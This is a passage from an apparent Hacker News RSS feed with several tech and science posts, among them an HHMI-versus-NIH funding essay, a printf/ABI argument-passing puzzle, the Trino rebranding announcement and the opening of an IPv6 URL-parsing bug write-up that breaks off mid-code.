[2]. Azoulay et al. 2011 states that 'Moreover, HHMI investigators appear to share the perception that their first appointment review is rather lax, with reviewers more interested in making sure that they have taken on new projects with uncertain payoffs, rather than insisting on achievements. Below, we validate this perception by showing that the second review is much more sensitive to performance than the first.'
</p>
<p>Both are similar in that they can be renewed; if one wants to work on a 20 year project, in theory one can roll the <a href="https://www.niaid.nih.gov/grants-contracts/apply-renewal">same</a> R01 four times, with the <a href="https://nexus.od.nih.gov/all/2016/02/16/are-attempts-at-renewal-successful/">likelihood</a> of being renewed starting at 30%. HHMI is more forgiving once one is in and in the event one is out: it provides <a href="https://www.hhmi.org/sites/default/files/Programs/Investigator/2018-HHMI-Investigator-Competition-FAQ.pdf">two years of phase-out</a> if a renewal is not successful and the renewal rate is &gt;80% anyway, leading to a median of 16 years of <a href="https://twitter.com/JSheltzer/status/1208442925249630209">support</a><sup><a href="#sidenote-2">2</a></sup>. Thus HHMI investigators can expect to be funded for longer, and because if they lose funding they don't have to be immediately looking for support, that should also help keep their eyes in the long term. This is not to say that HHMI investigators do not spend time applying for grants, you can search <a href="https://projectreporter.nih.gov/reporter.cfm">here</a> for example <a href="https://en.wikipedia.org/wiki/Feng_Zhang">Feng Zhang</a> (HHMI since 2018) and see that he got a DP1 in 2020 as well as R01s in 2020 and 2019. Even <a href="https://en.wikipedia.org/wiki/David_J._Anderson">David J. Anderson</a> (HHMI since 1989) can be seen applying for R01s in the same site. This is because the HHMI award, generous as it is, covers the investigator's salary, some research budget, special expenses for expensive equipment, but not every expense, and not the hiring of additional lab members.</p>
<p>There are other differences, HHMI <a href="https://www.hhmi.org/sites/default/files/Programs/Investigator/2018-HHMI-Investigator-Competition-FAQ.pdf">requires</a> researchers to spend 75% of their time doing research, whereas in R01s there is no such limit. DP1s are required to work half of their time on grant-related research.</p>
<p>This brief discussion is just to highlight that the "fund people, not projects" approach, even when looked at by using their usual life sciencesexemplars, is not as clear cut as it may seem. It may be more useful to consider two extreme idealized approaches instead:</p>
<ul>
<li>Fund projects: A scientist proposes to do a specific, well defined project. There is an expected deliverable and there may be milestones involved that have to be met. Rather then being open ended and highly uncertain, it is roughly known to be achievable. The project should be ended if it's not meeting its goals.</li>
<li>Fund people: A scientist is funded generously and have all their requirements for assistants and equipment met without paperwork or further reviews. They have zero accountability, and what they decide to research or publish has no bearing on the continuation of funding. In effect they have life tenure. They don't perish if they don't publish.</li>
</ul>
<p>It's clear that there are advantages and disadvantages to both approaches; they are the explore/exploit tradeoff with another name. The first one is similar to the <a href="https://www.dayoneproject.org/post/focused-research-organizations-to-accelerate-science-technology-and-medicine">Focused Research Organization</a> concept.</p>
<p>The second one sounds like tenure. But modern day tenure is not generally like this. Scientists are <a href="https://academia.stackexchange.com/questions/37986/is-it-possible-to-survive-in-university-academia-without-applying-for-grants">expected to continue to apply</a> for grants and bring money to the university (The university gets a cut), as well as to grow their lab; in turn as they now have a lab they have some obligation to their students, who do need to publish in high impact journals in order to get ahead in academia. Tenure pays just the salay (and 9 months of it in the case of US tenure, as the other 3 are expected to be covered with grants). It does not cover the cost of any materials employed during the course of research, or the salaries of research assistants (Those also have to come from grants). </p>
<p>Donald Braben <a href="https://nintil.com/review-scientific-freedom">points out</a> that before 1970 (or so)</p>
<blockquote>
<p>tenured academics with an individual turn of mind could usually dig out modest sources of funding to tackle any problem that interested them without first having to commit themselves in writing. Afterward, unconditional sources of funds would become increasingly diffi cult to find. Today, they are virtually nonexistent.</p>
<p>The way forward for ambitious young researchers was once clear, therefore. All they had to do was to acquire the necessary qualifications, and then to find a tenured appointment. To say the least, that was not easy, but not substantially more difficult than it would be today. However, having served their apprenticeship, they were free. They may have had to overcome the inevitable peer pressure if their plans were controversial, but their peers did not have power of veto— see Poster 1 .Written applications were necessary if expensive equipment or large teams were required, but tenured researchers with modest needs would meet few obstacles. </p>
</blockquote>
<p>This still sounds like modern day tenure! What has changed is that <em>if</em> more expensive equipment is now required (And this is most likely true in the life sciences than in theoretical physics) and that in turn requires grants, then academics now have that additional potential veto in a way that the cheaper experiments of the past did not have. And Braben can't argue that the new system selects for people that are good at getting grants. In the quote above he concedes that getting tenure was as hard back then; and plausibly to get tenure you needed the same things you do today.</p>
<p>The ones that come close to the "fund people" approach are not HHMI investigators, or the pre-1970 scientific community; those would be the self-funded <a href="https://en.wikipedia.org/wiki/Independent_scientist">independent scientists</a> that were wealthy enough to be able to do anything they wanted. Alfred Loomis' story in particular, how he managed to have the best equipped lab in the US, paid out of his Wall Street profits, seems the closest to the platonic form of the fund people approach.</p>
<h2 id="fund-people-not-metrics">Fund people, not metrics?</h2>
<p>Another distinction to be made here beyond people vs projects is <em>how</em> people or projects are selected. One can use impersonal metrics or one can get more personal and, eschew all bureaucracy and process and go full <a href="https://twitter.com/matthewclifford/status/1326479506983579648">nepotistic</a>. Though not intrinsically tied to "fund people", it is true that those approaches have historically been more linked to a personal approach. Ioannidis (<a href="https://www.nature.com/articles/477529a">2011</a>) discusses various "fund people" approaches which include using mechanisms like lotteries or just funding everyone. This is one of the two missing sectors of the 2x2 quadrant (In red, missing):</p>
<p><img loading="lazy" src="https://docs.google.com/drawings/d/e/2PACX-1vQ5u2jOns5eT5Ta_33-Y8APOXOPijFOyaCfy_xD8glo70oQ-DcemVZddoYmD3G9KO6Qhd_qIcCfy1ek/pub?w=960" alt=""></p>
<p>In the HHMI process, a scientist get personally interviewed in the later stages of being funded. For R01s, there is a committee (a study section) that one will never see or meet. The Rockefeller foundation (post WWII) took it to an even more extreme …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nintil.com/hhmi-and-nih">https://nintil.com/hhmi-and-nih</a></em></p>]]>
            </description>
            <link>https://nintil.com/hhmi-and-nih</link>
            <guid isPermaLink="false">hacker-news-small-sites-25566953</guid>
            <pubDate>Tue, 29 Dec 2020 05:09:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A little puzzle with printf() and C argument passing]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25566835">thread link</a>) | @todsacerdoti
<br/>
December 28, 2020 | https://utcc.utoronto.ca/~cks/space/blog/programming/PrintfAndArgumentPassing | <a href="https://web.archive.org/web/*/https://utcc.utoronto.ca/~cks/space/blog/programming/PrintfAndArgumentPassing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>A little puzzle with <code>printf()</code> and C argument passing</h2>

	<p><small>December 28, 2020</small></p>
</div><div><p>In <a href="https://randomascii.wordpress.com/2020/08/30/the-easy-ones-three-bugs-hiding-in-the-open/">The Easy Ones â€“ Three Bugs Hiding in the Open</a>,
Bruce Dawson gave us a little C puzzle in passing:</p>

<blockquote><p>The <a href="https://en.wikipedia.org/wiki/Stdarg.h">variable arguments</a> in
printf formatting means that it is easy to get type mismatches. The
practical results vary considerably:</p>

<ol><li>printf(â€œ0x%08lxâ€�, p); // Printing a pointer as an int â€“ truncation or worse on 64-bit </li>
<li>printf(â€œ%d, %fâ€�, f, i); // Swapping float and int â€“ could print nonsense, or might actually work (!) </li>
<li>printf(â€œ%s %dâ€�, i, s); // Swapping the order of string and int â€“ will probably crash</li>
</ol>

<p>[...] (aside: understanding why #2 often
prints the desired result is a good <a href="https://en.wikipedia.org/wiki/Application_binary_interface">ABI</a> puzzle)</p>
</blockquote>

<p>I had to think about this for a bit, and then I realized why and
how it can work (and why similar integer versus float argument
confusion can also work for other functions, even ones with fixed
argument lists). What it comes down to is that in some <a href="https://en.wikipedia.org/wiki/Application_binary_interface">ABI</a>s,
arguments are passed in registers (at least early arguments, before
you run out of registers), and <strong>floating point arguments are passed
in different registers than integers (and pointers)</strong>.  This is
true even for functions that take variable arguments and will walk
through them using stdarg macros (or at least it can be, depending
on the ABI).</p>

<p>Because floating point and non floating point arguments are passed
in different sets of registers, what matters isn't the total order
of arguments but the order of floating point or non-fp arguments.
So here, regardless of where '%f' is in the printf format, it always
causes printf() to get the first floating point argument, which can
never be confused with an integer argument. Similarly, the first
'%d' causes printf() to look for the second non-fp argument,
regardless of where it was in the argument order; it could be at
the end of several floating point arguments and still work.</p>

<p>(The '%d' makes printf() look for the second non-fp argument because
the first one was the format string. In an ABI that passed pointers
in a separate place than integers, it would still work out, since now
the first '%d' would be looking for the first integer argument.)</p>

<p>Using the excellent services of godbolt.org, we can see this in
action on 64-bit x86 in <a href="https://godbolt.org/z/hYz9Gn">a very small example</a> (I used a very small example and a
decent optimization level to get clear, minimal assembly code). The
floating point argument is passed in <code>xmm0</code>, while the format string
and the integer argument are passed in <code>edi</code> and <code>esi</code> respectively
(I don't know what <code>eax</code> is doing, but it probably has something
to do with the ABI). A similar thing happens on 64-bit ARM v8 (aka
Aarch64), as we can also see on godbolt with <a href="https://godbolt.org/z/jrxz96">the same example on
Aarch64</a>.</p>

<p>(Based on <a href="https://wiki.cdot.senecacollege.ca/wiki/AArch64_Register_and_Instruction_Quick_Start">this page</a>,
the Aarch64 <code>x0</code> and <code>w1</code> are in the same set of registers. Apparently
<code>d0</code> is a 64-bit version of the first floating point register, from
<a href="https://armkeil.blob.core.windows.net/developer/Files/pdf/graphics-and-multimedia/ARMv8_InstructionSetOverview.pdf">here</a>
[pdf]. I wound up looking up all of this to be sure I understood
what was going on in the Aarch64 call, so I might as well write it
down here.)</p>

<p>Since pointers and integers are normally passed in the same set of
registers (at least on 64-bit x86 and Aarch64), we can also see why
the third example is very likely to fail. Since the same set of
registers is used for both argument types, it's possible to use an
integer argument as a pointer argument, with a segmentation fault
as the likely result. Similarly, we can predict that '<code>printf("%s
%f", f, s);</code>' might well work.</p>

<p>PS: This confusion can happen in any language that follows the C
ABI on a platform with this sort of split usage of registers (although
many languages may prevent this sort of argument type confusion).
Not all languages do; famously, Go currently passes all arguments
on the stack (as of Go 1.15 and soon Go 1.16).</p>
</div></div>]]>
            </description>
            <link>https://utcc.utoronto.ca/~cks/space/blog/programming/PrintfAndArgumentPassing</link>
            <guid isPermaLink="false">hacker-news-small-sites-25566835</guid>
            <pubDate>Tue, 29 Dec 2020 04:45:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building Neural Networks from Scratch Book]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25566528">thread link</a>) | @JCPJ
<br/>
December 28, 2020 | https://jc-progjava.github.io/Building-Neural-Networks-From-Scratch/ | <a href="https://web.archive.org/web/*/https://jc-progjava.github.io/Building-Neural-Networks-From-Scratch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div id="visible">
            
            
            <p>In this mini-book, you will(hopefully) learn about different neural network structures. By the end of the book,
                I hope you also will have a solid conceptual understanding of how neural networks function.</p><p>I will briefly go through some necessary formulas and equations, but will mainly
                stick to broad definitions that are comprehendible to even middle school students(I’ll try!). Some topics are well
                beyond those taught in middle school, so you may want to look at more thorough and step-by-step walkthroughs on the
                topics on platforms like <a rel="noopener" href="https://khanacademy.org/" target="_blank">Khan Academy</a>.
                As you go through this book, you will also encounter several different projects and real-world problems that I will
                walk you through and solve. I highly recommend you take a try at solving them beforehand! Solutions that I give may
                not be the best and most state-of-the-art, so you can also try and tweak it a bit to make it better! I will try to
                add some optimizations to the code to make it faster and more efficient and give you a summary of what state-of-the-art
                methods data scientists now use. All code in this book is either pseudocode or written in Java, so you should be able to
                roughly interpret it if you have learned any C-like programming languages! You don’t need to learn one right away to
                continue reading either… I provide detailed explanations of each line of code. You can also find it all on
                <a rel="noopener" href="https://github.com/JC-ProgJava/Building-Neural-Networks-From-Scratch" target="_blank">GitHub</a> (with this book).</p>
        </div>
    </div><div>
        <h2>Tips &amp; Thanks</h2>
        <p>Currently none, you can have your feedback and review written here if you fill this <a rel="noopener" href="https://forms.gle/c9oB2PgWgAEwkKrEA" target="_blank">form</a>!</p>
        <br>
    </div></div>]]>
            </description>
            <link>https://jc-progjava.github.io/Building-Neural-Networks-From-Scratch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25566528</guid>
            <pubDate>Tue, 29 Dec 2020 03:50:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google Is Killing Our Productivity. What We Can Do About It?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25566426">thread link</a>) | @freediver
<br/>
December 28, 2020 | https://www.simplecto.com/google-killing-productivity/ | <a href="https://web.archive.org/web/*/https://www.simplecto.com/google-killing-productivity/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p><strong>tldr;</strong> Information retrieval is a critical part of creative work. Google's once awesome search product is now a tool of distraction. In response I share some ideas about new ways of working with "workspace" search.</p><h3 id="all-work-requires-looking-it-up">All work requires "looking it up"</h3><p>I've been a developer, a manager, a cook, and an old Mercedes station wagon repair man.</p><p>At every turn in those careers (some shorter lived than others) I have used information retrieval as a part of my workflow:</p><ul><li>In the kitchen I look up recipes.</li><li>I went onto forums, into old manuals, and specialist mechanics to figure out how things work on that old car.</li><li>Good old fashioned foolish "hold my beer" moments where I just had to take my best guess and hope for the best.</li><li>Ask my boss, mentor, or older folks that are around (and hope they know what they are talking about)</li></ul><h3 id="the-good-old-days">The Good Old Days</h3><p>There was a time when Google shortened the path to answers. Once we learned how to plug in the right keywords the right way it would turn over some hidden stones and reveal the gems underneath. In short order we were back to work armed with new information that would become knowledge.</p><p>But those days are gone. </p><p>The shareholders and advertisers took over and monetized the hell out of us.</p><blockquote>We were always the product.</blockquote><h3 id="google-shortens-the-distance-between-our-eyes-and-advertising">Google shortens the distance between our eyes and advertising</h3><p>Search something as simple as "Learn Django" and be greeted with this: a page full of ads and no organic results. Is this relevancy?</p><figure><img src="https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png 600w, https://www.simplecto.com/content/images/size/w1000/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png 1000w, https://www.simplecto.com/content/images/size/w1600/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png 1600w, https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png 1972w" sizes="(min-width: 720px) 720px"></figure><h3 id="advertising-and-seo-sewage-masquerading-as-content">Advertising and SEO sewage masquerading as content</h3><p>That field of relevant information is now a minefield of advertising and SEO sewage masquerading as content.</p><p><strong>This is especially true for developers. And even more true for new developers.</strong></p><p>It seems that I am frequently back on Google in search of a code snippet, a bug, or a docker container that already does the thing that I want.</p><p>The flow is always the same:</p><ol><li>Alt-tab to browser</li><li>Open google</li><li>Search something (<strong>this is a skill to develop</strong>)</li><li>Scan past all the ads, sketchy SEO'd sites, and hunt for what might be the right link. (<strong>This is another skill unto itself, and honed after years of bad clicks</strong>)</li><li>Click the link into new tab (there will be more new tabs as I hunt and peck)</li><li>Eventually I find a few candidate pages that might point me to a good solution.</li><li>Rinse, repeat forever.</li></ol><figure><img src="https://www.simplecto.com/content/images/2020/12/google-killing-productivity.jpg" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/google-killing-productivity.jpg 600w, https://www.simplecto.com/content/images/2020/12/google-killing-productivity.jpg 800w" sizes="(min-width: 720px) 720px"></figure><p>By the time I find something worth trying I've broken the flow and restart the climb back up the productivity curve.</p><hr><p><em>"OK, so I get it. Google no longer has your best interest at hear (if they every did). What do you propose?"</em></p><hr><p>Glad you asked.</p><h2 id="i-want-focused-results-eg-less-is-more-">I want focused results (eg. Less is more)</h2><p>In observing my own behavior I see there are a handful of resources I want to tap into when doing my work (development for example):</p><ul><li>Documentation</li><li>Code snippets</li><li>Stack traces</li><li>Community / Forums</li><li>Libraries and Plugins</li></ul><p>These come from only a few places. I don't need (or want) to walk the vast expanse of the web to only keep coming back to these same results. Google used to do a fine job of filtering and offering relevance, but again – those days are long gone.</p><p><strong>I want a workspace </strong>that focuses my attention on these few resources. I can jump into documentation, code, or find help from the <strong>curated</strong> resources offered by a niche/vertical search engine.</p><h3 id="niche-aka-vertical-search-is-worth-exploring">Niche (aka vertical) Search is worth exploring</h3><p>This is what I'm working on – a system of modules that stitch together as a focused, niche search engine. It is self-curated (by me or a community, or other entusiasts/subject matter experts) with the sole purpose to only return results optimized to my workflow.</p><p>I have:</p><ul><li>Scripts to acquire content via Web, RSS, and APIs</li><li>A database to store, retreive, and sort the information to my needs.</li><li>Simplified and controlled interfaces optimized to how I want to work, and how I want to consumer the information.</li></ul><p>The narrow scope of the project brings a few interesting side-effects:</p><ol><li>Shallow tech stack means I (or a small team) can understand all parts of it with relative competence.</li><li>Narrow focus of content means I don't have scaling issues in terms of compute, network, or storage. Only a few gigs at most.</li><li>Growing too large means that it is better to create a new engine with a narrower focus. This scales horizontally, but with some overhead on administration.</li><li>We move the challenge from the hard problem and opaque solutions of AI to the clear and simple and marketable solutions of human Curation.</li></ol><figure><div><div><p><img src="https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png" width="1944" height="1544" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png 600w, https://www.simplecto.com/content/images/size/w1000/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png 1000w, https://www.simplecto.com/content/images/size/w1600/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png 1600w, https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png 1944w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png" width="2000" height="1213" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png 600w, https://www.simplecto.com/content/images/size/w1000/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png 1000w, https://www.simplecto.com/content/images/size/w1600/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png 1600w, https://www.simplecto.com/content/images/size/w2400/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png 2400w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png" width="2000" height="1193" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png 600w, https://www.simplecto.com/content/images/size/w1000/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png 1000w, https://www.simplecto.com/content/images/size/w1600/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png 1600w, https://www.simplecto.com/content/images/size/w2400/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png 2400w" sizes="(min-width: 720px) 720px"></p></div></div><figcaption>My niche/vertical search engine workspace.</figcaption></figure><p>So this is what I've been thinking about. Over the next few weeks, when working on Django projects, I will make this my first destination when seeking answers. I am curious to see if it actually improves my workflow, focus, and productivity.</p><p>A second hypothesis I will test is if this can work for others working in other ecosystems such as Javascript or Go language.</p>
			</section></div>]]>
            </description>
            <link>https://www.simplecto.com/google-killing-productivity/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25566426</guid>
            <pubDate>Tue, 29 Dec 2020 03:28:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reading online comments affects us]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25566181">thread link</a>) | @behnamoh
<br/>
December 28, 2020 | https://socialmediapsychology.eu/2016/10/05/onlineandsocialmediacomments/ | <a href="https://web.archive.org/web/*/https://socialmediapsychology.eu/2016/10/05/onlineandsocialmediacomments/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://socialmediapsychology.eu/2016/10/05/onlineandsocialmediacomments/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25566181</guid>
            <pubDate>Tue, 29 Dec 2020 02:46:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We’re Rebranding PrestoSQL as Trino]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25566055">thread link</a>) | @rubinelli
<br/>
December 28, 2020 | https://trino.io/blog/2020/12/27/announcing-trino.html | <a href="https://web.archive.org/web/*/https://trino.io/blog/2020/12/27/announcing-trino.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>We’re rebranding PrestoSQL as Trino. The software and the community you have come to love and depend on aren’t 
going anywhere, we are simply renaming. <strong>Trino is the new name for PrestoSQL</strong>, the project supported by the founders 
and creators of Presto® along with the major contributors – just under a shiny new name. And now you can find us here:</p>

<ul>
  <li>GitHub: <a href="https://github.com/trinodb/trino">https://github.com/trinodb/trino</a>. Please give it a <a href="https://github.com/trinodb/trino/blob/master/.github/star.png">star</a>!</li>
  <li>Twitter: <a href="https://twitter.com/trinodb">@trinodb</a></li>
  <li>Slack: <a href="https://trino.io/slack.html">https://trino.io/slack.html</a></li>
</ul>

<p>If you want to learn why we’re doing this, read on…</p>

<!--more-->

<p>In 2012, Dain, David and Martin joined the Facebook data infrastructure team. Together with Eric Hwang, we created 
Presto® to address the problems of low latency interactive analytics over Facebook’s massive Hadoop data warehouse. 
One of our non-negotiable conditions was for Presto® to be an open source project. Open source is in our DNA - we had 
all used and participated in open source projects to various degrees in the past, and we recognized the power of open 
communities and developers coming together to build successful software that can stand the test of time.</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/team.jpg" alt=""></p>

<p>Over the next six years, we worked hard to build a healthy open source community and ecosystem around the project. We 
worked with developers and users all over the world and welcomed them into the Presto® community. Presto® was on a path 
of increasing growth and success, in large part because of the contributions from developers across many fields and all 
over the world.</p>

<p>Unfortunately in 2018, it became clear that Facebook management wanted to have tighter control over the project and its 
future. This culminated with their decision to grant Facebook developers commit rights on the project without any prior 
experience in Presto®. We strongly believe that this kind of decision is not compatible with having a healthy, open 
community. Moreover, they made this decision by fiat without engaging the Presto® community. As a matter of principle, 
we had no choice but to leave Facebook in order to focus on making sure Presto® continued to be a successful project 
with an open, collaborative and independent community. In reality, the choice was easy.</p>

<p>We started the Presto Software Foundation in January 2019 as an independent entity to oversee the development of the 
software and community, continuing the meritocratic system that had been in place over the previous 6 years. The community 
quickly consolidated under this new home. We intentionally stayed unemployed over the next 10 months to focus on expanding 
and strengthening the community by working directly with major users and contributors, as well as reaching out to a wider 
group of users and developers across the globe. This resulted in new use cases and an injection of energy, making the 
project more vibrant than ever before as even more new users and developers became engaged. But, don’t take our word for 
it, let the data speak for itself:</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/commits.png" alt=""></p>

<p>Months after this consolidation, Facebook decided to create a competing community using The Linux Foundation®. As a first 
action, Facebook applied for a trademark on Presto®. This was a surprising, norm-breaking move because up until that point, 
the Presto® name had been used without constraints by commercial and non-commercial products for over 6 years. In September 
of 2019, Facebook established the Presto Foundation at The Linux Foundation®, and immediately began working to enforce this 
new trademark. We spent the better part of the last year trying to agree to terms with Facebook and The Linux Foundation 
that would not negatively impact the community, but unfortunately we were unable to do so. The end result is that we must 
now change the name in a short period of time, with little ability to minimize user disruption.</p>

<p>On a personal note, and as the founders who named the project Presto® in the first place, this is an incredibly sad and 
disappointing turn of events. And while we will always have fondness for the name Presto®, we have come to accept that a 
name is just a name. To be frank, we’re tired of this endless distraction, and we intend to focus on what matters most 
and what we are best at doing – building high quality software everyone can rely on and fostering a healthy community 
of users and developers that build it and support it. We’re not going anywhere – we’re the same people, the same amazing 
software, under a new name: Trino.</p>

<p><strong>If you love this project, you already love Trino. ❤️</strong></p>


<p>Facebook is a registered trademark of Facebook Inc.  The Linux Foundation and Presto are trademarks of The Linux Foundation.</p>


  </div>

  
</article>

</div></div>]]>
            </description>
            <link>https://trino.io/blog/2020/12/27/announcing-trino.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25566055</guid>
            <pubDate>Tue, 29 Dec 2020 02:30:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Node.example.com Is an IP Address]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25565443">thread link</a>) | @nfrmatk
<br/>
December 28, 2020 | https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/ | <a href="https://web.archive.org/web/*/https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <main>
      
  <article>  
    
    <p>2020-12-28</p>
    
<p>Hello! Welcome to the once-yearly blog post! This year I'd like to examine the
most peculiar bug I encountered at work. To set the stage, let's start with a
little background. 📚</p>
<p>When we write <a href="https://en.wikipedia.org/wiki/URL">URLs</a> with a <a href="https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers">non-standard</a> <a href="https://en.wikipedia.org/wiki/Port_(computer_networking)">port</a> we
specify the port after a <code>:</code>. With <a href="https://en.wikipedia.org/wiki/Hostname">hostnames</a> and <a href="https://en.wikipedia.org/wiki/IPv4#Addressing">IPv4</a> addresses
this is straightforward. Here's some <a href="https://www.python.org/">Python</a> code to show how easy it is.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(</span><span>"https://node.example.com:8000"</span><span>)
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'node.example.com'</span><span>, </span><span>8000</span><span>)
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(</span><span>"https://192.168.0.1:8000"</span><span>)
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'192.168.0.1'</span><span>, </span><span>8000</span><span>)
</span></code></pre>
<p>Unfortunately, when <a href="https://en.wikipedia.org/wiki/IPv6#Addressing">IPv6</a> addresses are involved some ambiguity is introduced.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(
</span><span>...     </span><span>"https://fdc8:bf8b:e62c:abcd:1111:2222:3333:4444:8000"
</span><span>... )
</span><span>...
</span><span>&gt;&gt;&gt; </span><span>url.hostname
</span><span>'fdc8'
</span><span>&gt;&gt;&gt; </span><span>try</span><span>:
</span><span>...     </span><span>url.port
</span><span>... </span><span>except </span><span>ValueError </span><span>as </span><span>error:
</span><span>...     </span><span>print</span><span>(error)
</span><span>...
Port could </span><span>not </span><span>be cast to integer value </span><span>as</span><span> </span><span>'bf8b:e62c:abcd:1111:2222:3333:4444:8000'
</span></code></pre>
<p>Since IPv6 addresses use a "colon-hex" format with <a href="https://en.wikipedia.org/wiki/Hexadecimal">hexadecimal</a> fields
separated by <code>:</code> we can't tell a port apart from a normal field. Notice in the
example above that the hostname is truncated after the first <code>:</code>, not the one
just before <code>8000</code>.</p>
<p>Fortunately, the spec for URLs recognizes this ambiguity and gives us a way to
handle it. <a href="https://www.ietf.org/rfc/rfc2732.txt">RFC 2732 (<em>Format for Literal IPv6 Addresses in URL's</em>)</a>
says</p>
<blockquote>
<p>To use a literal IPv6 address in a URL, the literal address should be
enclosed in "[" and "]" characters.</p>
</blockquote>
<p>Update our example above to include <code>[</code> and <code>]</code> and voilà! It just works.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(
</span><span>...     </span><span>"https://[fdc8:bf8b:e62c:abcd:1111:2222:3333:4444]:8000"
</span><span>... )
</span><span>...
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'fdc8:bf8b:e62c:abcd:1111:2222:3333:4444'</span><span>, </span><span>8000</span><span>)
</span></code></pre>
<p>Armed with that knowledge we can dive into the problem. 🤿</p>

<p>A few months ago a co-worker of mine wrote a seemingly innocuous function.</p>
<pre><code><span>from </span><span>ipaddress </span><span>import </span><span>ip_address


</span><span>def </span><span>safe_host</span><span>(</span><span>host</span><span>): 
    </span><span>"""Surround `host` with brackets if it is an IPv6 address."""
    </span><span>try</span><span>:
        </span><span>if </span><span>ip_address(host)</span><span>.version </span><span>== </span><span>6</span><span>:
            </span><span>return </span><span>"[</span><span>{}</span><span>]"</span><span>.format(host)
    </span><span>except </span><span>ValueError</span><span>:
        </span><span>pass
    return </span><span>host
</span></code></pre>
<p>Elsewhere in the code it was invoked something like this, so that hostnames,
IPv4 addresses, and IPv6 addresses could all be safely interpolated.</p>
<pre><code><span>url </span><span>= </span><span>"https://</span><span>{host}</span><span>:8000/some/path/"</span><span>.format(host</span><span>=</span><span>safe_host(host))
</span></code></pre>
<p>Since my co-worker is awesome they wrote tests to validate their code. ✅</p>
<pre><code><span>def </span><span>test_safe_host_with_hostname</span><span>():
    </span><span>"""Hostnames should be unchanged."""
    </span><span>assert </span><span>safe_host(</span><span>"node.example.com"</span><span>) </span><span>== </span><span>"node.example.com"


</span><span>def </span><span>test_safe_host_with_ipv4_address</span><span>():
    </span><span>"""IPv4 addresses should be unchanged."""
    </span><span>assert </span><span>safe_host(</span><span>"192.168.0.1"</span><span>) </span><span>== </span><span>"192.168.0.1"


</span><span>def </span><span>test_safe_host_with_ipv6_address</span><span>():
    </span><span>"""IPv6 addresses should be surrounded by brackets."""
    </span><span>assert </span><span>(
